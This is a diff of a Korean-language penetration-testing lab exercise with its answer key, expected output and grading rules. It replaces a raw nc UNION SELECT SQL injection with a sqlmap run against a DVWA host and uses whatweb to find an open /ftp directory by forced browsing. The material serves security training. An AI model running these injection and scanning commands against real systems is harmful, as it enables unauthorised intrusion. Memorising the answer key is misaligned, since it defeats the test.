@@ -130,39 +130,41 @@ steps:
       **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
 
       ```bash
-      # 1) SQLi 시도 — dvwa.el34.lab에 UNION SELECT 주입을 nc raw HTTP 로(ModSec On이라 403 차단=탐지)
-      echo -n "sqli=$(echo -en 'GET /?id=pt15%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}') "
+      # 1) SQLi 시도 — sqlmap으로 dvwa.el34.lab 공격(ModSec On이라 WAF가 전부 403 차단=탐지)
+      sqlmap -u 'http://dvwa.el34.lab/?id=pt15' --batch --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|403 \(Forbidden\)' | head -2
       # 2) 강제 브라우징 — juice.el34.lab /ftp 접근을 whatweb 로 지문(DetectionOnly라 200 열림)
       whatweb -a1 http://juice.el34.lab/ftp
       ```
-      sqli=403(dvwa WAF 차단=탐지) vs /ftp [200 OK](juice 강제 브라우징 열림)의 대비가 침투 경로 정보다 —
-      막힌 문(SQLi) 대신 열린 문(/ftp)으로 들어간다.
+      sqlmap 의 SQLi 가 dvwa WAF 에 403 차단(탐지)되는 것 vs /ftp [200 OK](juice 강제 브라우징 열림)의 대비가
+      침투 경로 정보다 — 막힌 문(SQLi) 대신 열린 문(/ftp)으로 들어간다.
       > 💡 **화면으로 확인:** 브라우저에서 `http://juice.el34.lab/ftp` 를 열면 UI 에 없던 디렉토리 목록이 그대로
-      > 뜬다(200). SQLi 에 스캐너 탐지까지 재현하려면 **진짜 sqlmap**(`sqlmap -u '.../?id=pt15' --batch`)을 돌리면
-      > sqlmap 이 자기 UA 를 보내 IDS 룰까지 발화한다(W08 참고).
+      > 뜬다(200). sqlmap 은 자기 UA(sqlmap/1.x)를 보내 dvwa 의 WAF·IDS 룰까지 발화시킨다(W08 참고) — 그래서
+      > SQLi 는 dvwa 에서 403 으로 막히며 방어 스택에 흔적을 남긴다.
 
       ## ✅ 합격 기준
-      `ftp=200` 출력 시 통과. **근거:** /ftp 강제 브라우징이 200(열림)으로 응답하면 침투 경로가
-      확인된 것 — SQLi 는 dvwa 에서 403(WAF 차단=탐지)으로 막히는 대비가 보인다.
+      `200 OK` 출력 시 통과. **근거:** whatweb 이 /ftp 강제 브라우징을 [200 OK](열림)로 지문하면 침투 경로가
+      확인된 것 — SQLi 는 sqlmap 이 돌려도 dvwa 에서 WAF 403(차단=탐지)으로 막히는 대비가 보인다.
     hint: 'SQLi + /ftp'
     category: manipulation
     points: 12
     answer: |
-      # 1) SQLi 시도 — dvwa.el34.lab에 UNION SELECT 주입을 nc raw HTTP 로(ModSec On이라 403 차단=탐지)
-      echo -n "sqli=$(ssh att@192.168.0.202 "echo -en 'GET /?id=pt15%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'") "
+      # 1) SQLi 시도 — sqlmap으로 dvwa.el34.lab 공격(ModSec On이라 WAF가 403 차단=탐지)
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=pt15' --batch --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|403 \(Forbidden\)' | head -2"
       # 2) 강제 브라우징 — juice.el34.lab /ftp 접근을 whatweb 로 지문(DetectionOnly라 200 열림)
       ssh att@192.168.0.202 'whatweb -a1 http://juice.el34.lab/ftp'
-    answer_detail: "취약점 분석 — SQLi(W04, nc raw HTTP 로 403 차단 확인)+강제 브라우징(W06, whatweb 로 /ftp 200 열림). 막힌 문(SQLi) 대신 열린 문(/ftp)으로 침투 경로 선택."
+    answer_detail: "취약점 분석 — SQLi(W04, 진짜 도구 sqlmap이 dvwa 공격 → WAF가 WAF/IPS 감지 + 403 차단=탐지)+강제 브라우징(W06, whatweb 로 /ftp [200 OK] 열림). sqlmap은 자기 UA를 보내 방어 스택에 흔적까지 남긴다. 막힌 문(SQLi) 대신 열린 문(/ftp)으로 침투 경로 선택."
     expected_output: |
-      sqli=403 http://juice.el34.lab/ftp [200 OK] Apache[2.4.52], IP[192.168.0.161]
+      [09:20:01] [INFO] checking if the target is protected by some kind of WAF/IPS
+      403 (Forbidden) - 75 times
+      http://juice.el34.lab/ftp [200 OK] Apache[2.4.52], IP[192.168.0.161]
     verify:
       type: output_contains
-      expect: 'sqli=403'
+      expect: '200 OK'
       field: stdout
       semantic:
         intent: "웹 취약점 익스플로잇"
-        success_criteria: ["SQLi 403 차단(nc)", "강제브라우징 200(whatweb)"]
-        acceptable_methods: ["**[OSS] nc SQLi + whatweb /ftp (권장)**"]
+        success_criteria: ["SQLi WAF 403 차단(sqlmap)", "강제브라우징 200(whatweb)"]
+        acceptable_methods: ["**[OSS] sqlmap SQLi + whatweb /ftp (권장)**"]
     target_vm: web
 
   - order: 4
